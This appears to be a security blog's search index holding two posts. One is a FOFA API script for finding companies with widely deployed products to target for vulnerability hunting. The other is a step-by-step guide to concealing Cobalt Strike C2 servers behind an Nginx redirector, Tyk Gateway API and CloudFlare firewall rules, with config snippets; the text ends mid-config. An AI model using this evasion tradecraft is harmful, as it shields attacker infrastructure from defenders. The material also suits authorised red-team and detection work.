<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>FOFA通用产品收集脚本</title>
      <link href="/2022/10/22/FOFA%E9%80%9A%E7%94%A8%E4%BA%A7%E5%93%81%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC/"/>
      <url>/2022/10/22/FOFA%E9%80%9A%E7%94%A8%E4%BA%A7%E5%93%81%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本项目是对项目：<a href="https://github.com/RaiderZP/cnvd_fofa_gather">https://github.com/RaiderZP/cnvd_fofa_gather</a> 进行的修改，更改为使用FOFA官方提供的查询接口。本项目去除了原项目中的代理池功能，通过设置5秒的访问间隔时间来保证查询的成功率。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>通过公司名称，在fofa上搜索可能存在通用产品的公司，原理是判断网站标题数目以及独立IP数达到一定条件时将该标题以及公司名称导出；如果想挖掘cnvd证书，可导出注册资金大于5000w的公司到这个脚本中进行通用系统收集。</p><h2 id="0x02-使用方法"><a href="#0x02-使用方法" class="headerlink" title="0x02 使用方法"></a>0x02 使用方法</h2><p>修改脚本第10、11行为你的FOFA账号的邮箱和API KEY</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 填入fofa账号的email和API_KEY</span></span><br><span class="line">email = <span class="string">&#x27;YOUR_EMAIL&#x27;</span></span><br><span class="line">api_key = <span class="string">&#x27;API_KEY&#x27;</span></span><br></pre></td></tr></table></figure><p>将公司名称放入<code>gs.txt</code>文件中，执行该脚本即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 new_cnvd_fofa_gather.py</span><br></pre></td></tr></table></figure><h2 id="0x03-项目地址"><a href="#0x03-项目地址" class="headerlink" title="0x03 项目地址"></a>0x03 项目地址</h2><p><a href="https://github.com/colind0pe/new_cnvd_fofa_gather">https://github.com/colind0pe/new_cnvd_fofa_gather</a></p><h2 id="0x04-脚本代码"><a href="#0x04-脚本代码" class="headerlink" title="0x04 脚本代码"></a>0x04 脚本代码</h2> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入fofa账号的email和API_KEY</span></span><br><span class="line">email = <span class="string">&#x27;YOUR_EMAIL&#x27;</span></span><br><span class="line">api_key = <span class="string">&#x27;API_KEY&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用fofa api的统计聚合接口</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fofa_search</span>(<span class="params">kjgs</span>):</span></span><br><span class="line">    fofa_api = <span class="string">&#x27;https://fofa.info/api/v1/search/stats??email=&#123;&#125;&amp;key=&#123;&#125;&amp;fields=title&amp;qbase64=&#x27;</span>.<span class="built_in">format</span>(email,api_key)</span><br><span class="line">    keyword = <span class="string">&#x27;&quot;&#x27;</span> + kjgs + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    bs64_keyword = <span class="built_in">str</span>(base64.b64encode(keyword.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    url = fofa_api + bs64_keyword</span><br><span class="line"></span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)   <span class="comment"># fofa限制请求速率，设置请求间隔为5秒</span></span><br><span class="line">    json_result = json.loads(result.content)</span><br><span class="line">    ip_count = json_result[<span class="string">&#x27;distinct&#x27;</span>][<span class="string">&#x27;ip&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> ip_count &lt; <span class="number">20</span>:</span><br><span class="line">        <span class="built_in">print</span>(kjgs + <span class="string">&quot; ---&gt; 独立IP总数：&quot;</span> + <span class="built_in">str</span>(ip_count))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;result.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(kjgs + <span class="string">&quot; ---&gt; 独立IP总数：&quot;</span> + <span class="built_in">str</span>(ip_count))</span><br><span class="line">                f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 独立IP总数不为0时获取对应的标题榜首和标题对应数量</span></span><br><span class="line">        title = json_result[<span class="string">&#x27;aggs&#x27;</span>][<span class="string">&#x27;title&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        title_count = json_result[<span class="string">&#x27;aggs&#x27;</span>][<span class="string">&#x27;title&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;count&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(kjgs + <span class="string">&quot; ---&gt; 独立IP总数：&quot;</span> + <span class="built_in">str</span>(ip_count) + <span class="string">&quot; ---&gt; 标题榜首：&quot;</span> + title + <span class="string">&quot; ---&gt; 标题对应数：&quot;</span> + <span class="built_in">str</span>(title_count))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;result.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(kjgs + <span class="string">&quot; ---&gt; 独立IP总数：&quot;</span> + <span class="built_in">str</span>(ip_count) + <span class="string">&quot; ---&gt; 标题榜首：&quot;</span> + title + <span class="string">&quot; ---&gt; 标题对应数：&quot;</span> + <span class="built_in">str</span>(title_count))</span><br><span class="line">                f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.close()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 打开公司列表，获取公司名称</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始收集--------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;gs.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>):</span><br><span class="line">        gs = <span class="built_in">str</span>(f, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        gs = gs.strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 去除科技、技术、股份、有限公司等字符</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;科技&#x27;</span>, gs):</span><br><span class="line">                start = re.search(<span class="string">r&#x27;科技&#x27;</span>, gs).span()[<span class="number">0</span>]</span><br><span class="line">                kj = gs[:start]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 去除括号内容</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> kj:</span><br><span class="line">                    start = re.search(<span class="string">r&#x27;\(&#x27;</span>, kj).span()[<span class="number">0</span>]</span><br><span class="line">                    end = re.search(<span class="string">r&#x27;\)&#x27;</span>, kj).span()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    kj_last = kj.replace(kj[start:end], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    fofa_search(kj_last)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fofa_search(kj)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> re.search(<span class="string">r&#x27;技术&#x27;</span>, gs):</span><br><span class="line">                start = re.search(<span class="string">r&#x27;技术&#x27;</span>, gs).span()[<span class="number">1</span>]</span><br><span class="line">                kj = gs[:start]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> kj:</span><br><span class="line">                    start = re.search(<span class="string">r&#x27;\(&#x27;</span>, kj).span()[<span class="number">0</span>]</span><br><span class="line">                    end = re.search(<span class="string">r&#x27;\)&#x27;</span>, kj).span()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    kj_last = kj.replace(kj[start:end], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    fofa_search(kj_last)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fofa_search(kj)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> re.search(<span class="string">r&#x27;软件&#x27;</span>, gs):</span><br><span class="line">                start = re.search(<span class="string">r&#x27;软件&#x27;</span>, gs).span()[<span class="number">1</span>]</span><br><span class="line">                kj = gs[:start]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> kj:</span><br><span class="line">                    start = re.search(<span class="string">r&#x27;\(&#x27;</span>, kj).span()[<span class="number">0</span>]</span><br><span class="line">                    end = re.search(<span class="string">r&#x27;\)&#x27;</span>, kj).span()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    kj_last = kj.replace(kj[start:end], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    fofa_search(kj_last)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fofa_search(kj)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> re.search(<span class="string">r&#x27;股份&#x27;</span>, gs):</span><br><span class="line">                start = re.search(<span class="string">r&#x27;股份&#x27;</span>, gs).span()[<span class="number">0</span>]</span><br><span class="line">                kj = gs[:start]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> kj:</span><br><span class="line">                    start = re.search(<span class="string">r&#x27;\(&#x27;</span>, kj).span()[<span class="number">0</span>]</span><br><span class="line">                    end = re.search(<span class="string">r&#x27;\)&#x27;</span>, kj).span()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    kj_last = kj.replace(kj[start:end], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    fofa_search(kj_last)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fofa_search(kj)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> re.search(<span class="string">r&#x27;有限&#x27;</span>, gs):</span><br><span class="line">                start = re.search(<span class="string">r&#x27;有限&#x27;</span>, gs).span()[<span class="number">0</span>]</span><br><span class="line">                kj = gs[:start]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> kj:</span><br><span class="line">                    start = re.search(<span class="string">r&#x27;\(&#x27;</span>, kj).span()[<span class="number">0</span>]</span><br><span class="line">                    end = re.search(<span class="string">r&#x27;\)&#x27;</span>, kj).span()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    kj_last = kj.replace(kj[start:end], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    fofa_search(kj_last)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fofa_search(kj)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> gs:</span><br><span class="line">                    start = re.search(<span class="string">r&#x27;\(&#x27;</span>, gs).span()[<span class="number">0</span>]</span><br><span class="line">                    end = re.search(<span class="string">r&#x27;\)&#x27;</span>, gs).span()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    gs_last = gs.replace(gs[start:end], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    fofa_search(gs_last)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    kj = gs</span><br><span class="line">                    fofa_search(kj)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> u:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;main_err:&#x27;</span>, u)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FOFA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Nginx、Tyk Gateway API和CloudFlare防火墙隐藏C2设施</title>
      <link href="/2022/08/25/%E5%88%A9%E7%94%A8Nginx%E3%80%81Tyk-Gateway-API%E5%92%8CCloudFlare%E9%98%B2%E7%81%AB%E5%A2%99%E9%9A%90%E8%97%8FC2%E8%AE%BE%E6%96%BD/"/>
      <url>/2022/08/25/%E5%88%A9%E7%94%A8Nginx%E3%80%81Tyk-Gateway-API%E5%92%8CCloudFlare%E9%98%B2%E7%81%AB%E5%A2%99%E9%9A%90%E8%97%8FC2%E8%AE%BE%E6%96%BD/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文首发于<a href="https://xz.aliyun.com/t/11662">先知社区</a>，未经允许禁止转载</p></blockquote><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Cobalt Strike的特征已经被各大安全厂商标记烂了，加上搜索引擎、空间测绘的扫描，在配置C2域名后，如果不做好基础设施的隐匿，很快会出现下图的情况。（图片截取自某情报社区）</p><img src="https://s2.loli.net/2022/08/25/oZv4UrYhA8yqLcK.png" style="zoom:67%;" /><p>隐藏C2的手法有很多，比如早些时候的域前置和最近热门的利用云函数隐藏。但是如今许多CDN厂商都已经禁用了域前置技术，而云函数是有免费额度的，超过之后会开始计费，许多蓝队反制帖子已经开始分享消耗云函数额度的方法了。</p><p>最近看到一篇利用Tyk Gateway API隐藏C2流量的文章，通过配置Tyk Gateway API转发恶意流量，以达到类似于域前置，或者腾讯云函数隐藏C2的效果。</p><p>在这个基础上，通过将域名托管到CloudFlare，配置Nginx过滤不符合规则的请求，并通过配置CloudFlare防火墙只允许Tyk Gateway API的流量访问C2域名，可以达到隐藏C2域名，并且防止搜索引擎、空间测绘扫描和识别Cobalt Strike特征导致域名或IP被标记。</p><p>本文基于已经将域名托管到CloudFlare并配置SSL证书的情况，如果你不知道如何使用CloudFlare和配置SSL证书，请自行搜索相关资料。</p><h2 id="0x02-配置Nginx"><a href="#0x02-配置Nginx" class="headerlink" title="0x02 配置Nginx"></a>0x02 配置Nginx</h2><p>将域名托管到CloudFlare后，可以配置Nginx反向代理来过滤部分请求，只让信标流量转发进服务器。</p><h3 id="自定义Nginx配置文件"><a href="#自定义Nginx配置文件" class="headerlink" title="自定义Nginx配置文件"></a>自定义Nginx配置文件</h3><p>Nginx的配置文件还是有点复杂的，可以使用<a href="https://github.com/threatexpress/cs2modrewrite">cs2modrewrite</a>进行生成，然后根据需求进行修改。</p><p>这里以使用<a href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.5.profile">jquery-c2.4.5.profile</a>作为C2配置文件的情况示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./cs2nginx.py -i jquery-c2.4.5.profile -c https://127.0.0.1:8443 -r http://www.baidu.com/ -H yourc2.domain &gt; ./nginx.conf</span><br></pre></td></tr></table></figure><ul><li>-i：指定C2配置文件</li><li>-c：指定内部的监听端口</li><li>-r：指定302跳转的地址</li><li>-H：指定你的域名</li></ul><p>通过该工具生成的Nginx配置文件的<code>server</code>块的部分配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">set</span> $C2_SERVER https://127.0.0.1:8443;</span><br><span class="line">        <span class="attribute">set</span> $REDIRECT_DOMAIN http://www.baidu.com/;</span><br><span class="line">        <span class="attribute">server_name</span> yourc2.domain;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">        <span class="attribute">listen</span> [::]:<span class="number">443</span> ssl;</span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">       <span class="attribute">location</span> <span class="regexp">~ ^(/jquery-3.3.2.slim.min.js.*|/jquery-3.3.1.min.js.*|/jquery-3.3.1.slim.min.js.*|/jquery-3.3.2.min.js.*)$</span> &#123;<span class="attribute">if</span> ( $http_user_agent != <span class="string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">          &#125;</span><br><span class="line">            <span class="attribute">proxy_pass</span>          $C2_SERVER;</span><br><span class="line">......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">location</span> @<span class="literal">redirect</span> &#123;</span><br><span class="line">                <span class="attribute">return</span> <span class="number">302</span> $REDIRECT_DOMAIN$request_uri;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>使用Nginx加载该配置文件后。Nginx将监听外部的80、443端口，并将符合规则的请求转发到内部的8443端口，不符合规则的请求将跳转到<code>http://www.baidu.com/</code>。</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>此时通过对服务器IP地址的扫描就无法获取到我们的beacon stage了。</p><img src="https://s2.loli.net/2022/08/26/rNz75bAiwQtkERq.png" alt="image-20220826100459907" style="zoom:67%;" /><h2 id="0x03-配置Tyk-Gateway-API"><a href="#0x03-配置Tyk-Gateway-API" class="headerlink" title="0x03 配置Tyk Gateway API"></a>0x03 配置Tyk Gateway API</h2><h3 id="注册账户"><a href="#注册账户" class="headerlink" title="注册账户"></a>注册账户</h3><p>访问<a href="https://account.cloud-ara.tyk.io/signup">注册地址</a>，填写用户名、邮箱、密码等信息后点击注册，注册成功后选择免费版。</p><img src="https://s2.loli.net/2022/08/25/Q58cZ3YsdFaqMhu.png" alt="image-20220825174137229" style="zoom:67%;" /><p>然后设置组织名称，设置好后会提示<code>Deployment successful</code>。</p><h3 id="创建并配置API"><a href="#创建并配置API" class="headerlink" title="创建并配置API"></a>创建并配置API</h3><p>点击<code>Manage APIs</code>后会看到如下页面：</p><img src="https://s2.loli.net/2022/08/25/eUybjDunGM8oJzr.png" alt="img" style="zoom: 67%;" /><p>接下来逐一创建并配置http-get API、http-post API、Stager-x86 API、Stager-x64 API。以下以http-get API为例。</p><p>假设你的域名为<code>cslabtest.live</code>，且C2配置文件如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http-<span class="builtin-name">get</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">&quot;/api/v2/login&quot;</span>;</span><br><span class="line">   <span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http-post &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">&quot;/api/v2/status&quot;</span>;</span><br><span class="line">   <span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x86 <span class="string">&quot;/api/v2/GetProfilePicture&quot;</span>;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x64 <span class="string">&quot;/api/v2/GetAttachment&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击<code>Design new API</code>并填写API信息。</p><img src="https://s2.loli.net/2022/08/25/4m2H1xNwMij3Gu8.png" alt="img" style="zoom:67%;" /><p>创建好后进一步配置API，来让它能够将请求转发到我们的C2服务器。</p><p>现在我们需要更改<code>Listen path</code>和<code>Target URL</code>，TYK会监听<code>Listen path</code>的地址，并将请求转发到<code>Target URL</code>。</p><p>（注：若C2配置文件为jquery-c2.4.5.profile，则将<code>Listen path</code>和<code>Target URL</code>的路径配置为相对应的<code>.js</code>的路径）</p><img src="https://s2.loli.net/2022/08/25/9u8Bsjh6cSMCfFQ.png" alt="img" style="zoom:67%;" /><p>为了能够上线CS，还要配置<code>Rate Limiting and Quotas</code>。都选择disable即可。</p><img src="https://s2.loli.net/2022/08/25/sbpULn2YTPhvwyx.png" alt="img" style="zoom:67%;" /><p>然后来到<code>Advanced Options</code>，取消勾选<code>Enable caching</code>。</p><img src="https://s2.loli.net/2022/08/25/ax9wSqE2el6nRJ7.png" alt="img"  /><p>按这个步骤逐一新建http-get API、http-post API、Stager-x86 API、Stager-x64 API。</p><h3 id="设置访问验证策略"><a href="#设置访问验证策略" class="headerlink" title="设置访问验证策略"></a>设置访问验证策略</h3><p>将上一步新建的API的<code>Authentication</code>更改为<code>Basic Authentication</code>，如下所示：</p><img src="https://s2.loli.net/2022/08/25/1KWilQdpevuoM7y.png" alt="img" style="zoom:67%;" /><p>然后来到<code>Policies</code>新建策略，选择你新建的四个API。</p><img src="https://s2.loli.net/2022/08/25/l1HnpmuLrQF6tIX.png" alt="image-20220825181321725" style="zoom:67%;" /><p>然后点击<code>Global Limits and Quota</code>，确认禁用<code>Rate Limiting</code>。</p><img src="https://s2.loli.net/2022/08/25/NRX1zoLMPQjOF9f.png" alt="img" style="zoom:67%;" /><p>接着配置策略名称并设置密钥过期时间。</p><img src="https://s2.loli.net/2022/08/25/3s257tH9WXQuK8B.png" alt="img" style="zoom:67%;" /><p>点击<code>Create Policy</code>以保存新策略，之后可以在<code>Policies</code>看到它：</p><img src="https://s2.loli.net/2022/08/25/6GE1ygYCP753wdL.png" alt="img" style="zoom:67%;" /><h3 id="配置访问验证Key"><a href="#配置访问验证Key" class="headerlink" title="配置访问验证Key"></a>配置访问验证Key</h3><p>来到<code>Keys</code>，点击<code>ADD KEY</code>，然后在<code>Apply policy</code>选择我们之前创建的策略，并选择API。</p><img src="https://s2.loli.net/2022/08/25/kMVjDTvq6t59m7x.png" alt="image-20220825182202475" style="zoom:67%;" /><p>最后来到<code>Authentication</code>输入需要设置的用户名、密码，这里使用<code>test:testtesttest</code>作为用户名、密码。</p><img src="https://s2.loli.net/2022/08/25/IVfpUkga6KrndHM.png" alt="img" style="zoom:67%;" /><p><code>Key</code>创建成功后会有如下提示：</p><img src="https://s2.loli.net/2022/08/25/OuLAM4y9PdHwSG2.png" alt="img" style="zoom:67%;" /><h3 id="配置C2配置文件"><a href="#配置C2配置文件" class="headerlink" title="配置C2配置文件"></a>配置C2配置文件</h3><p>由于上一步我们设置了访问验证，所以要在C2配置文件中添加一个请求头才能正常上线CS。</p><p><code>Authorization</code>的请求头设置格式如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Authorization</span>: <span class="variable">Basic</span> <span class="function"><span class="title">base64</span>(<span class="variable">username</span>:<span class="variable">password</span>)</span></span><br></pre></td></tr></table></figure><p>所以按上一步添加的<code>Key</code>，我们要在C2配置文件中添加如下请求头：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span>: Basic dGVzdDp<span class="number">0</span>ZXN<span class="number">0</span>dGVzdHRlc<span class="number">3</span>Q=</span><br></pre></td></tr></table></figure><p>最终配置文件如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">http-<span class="builtin-name">get</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">&quot;/api/v2/login&quot;</span>;</span><br><span class="line">    </span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">&quot;Authorization&quot;</span> <span class="string">&quot;Basic dGVzdDp0ZXN0dGVzdHRlc3Q=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">   <span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">&#125;</span><br><span class="line"> 